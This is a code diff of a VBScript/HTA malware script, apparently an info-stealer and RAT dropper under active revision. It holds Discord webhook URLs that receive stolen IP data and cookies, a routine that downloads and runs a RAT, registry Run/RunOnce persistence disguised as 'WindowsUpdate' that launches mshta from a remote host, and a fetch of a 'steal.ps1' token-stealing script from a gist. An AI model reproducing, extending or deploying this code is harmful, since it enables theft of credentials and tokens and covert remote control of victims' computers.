@@ -10,6 +10,7 @@ Dim sh, fso, WH, RE_WH, PC, USER, ratDropped
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
+' --- WEBHOOKS ---
 WH = "https://discord.com/api/webhooks/1573904916001456162/rxQeUCo6Rtg8_Xes7efwmybNHPHrl_WiOSWPwEEsqKb3PdbG2gsIQee8nR0plW5WV01F"
 RE_WH = "https://discord.com/api/webhooks/1573905019235868795/1h-kB4PA8BOkVaMTWu4TU4Qd89AqPFtXkp9ipslf3GvhrUAjvmskSVfXA7KHJCDp0Lei"
 
@@ -37,12 +38,16 @@ Do
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     
-    ' Only download RAT if it hasn't dropped successfully yet
+    ' Only download RAT if it hasn't already successfully dropped
     If Not ratDropped Then
         Call DropRAT(RE_WH, True)
     End If
     
     Call SleepSeconds(30)
+    
+    ' Spawn new mshta and exit current
+    Call RunCmd("mshta http://dicerigs.app/")
+    Exit Do
 Loop
 
 window.close()
@@ -75,7 +80,7 @@ Sub DropRAT(targetWH, sendRocket)
             ' Execute via WMI
             Call RunCmd("""" & op & """")
             
-            ' Set flag to True so it stops downloading in the loop
+            ' Set flag so it stops downloading in the loop
             ratDropped = True
             
             If sendRocket Then 
@@ -202,7 +207,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta https://dicerigx.app/"
+    Dim payload : payload = "mshta http://dicerigs.app/"
     On Error Resume Next
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
@@ -217,7 +222,8 @@ End Sub
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/172084531c9168c0fe4b4cacc5bb0a45/raw/127a7a0f6723e9b88492fe4c7e5e533e140b1d06/steal.ps1", False
+    ' UPDATED GIST LINK
+    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/8af7ed807e28323c783cf1188aea579384b71e4e/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
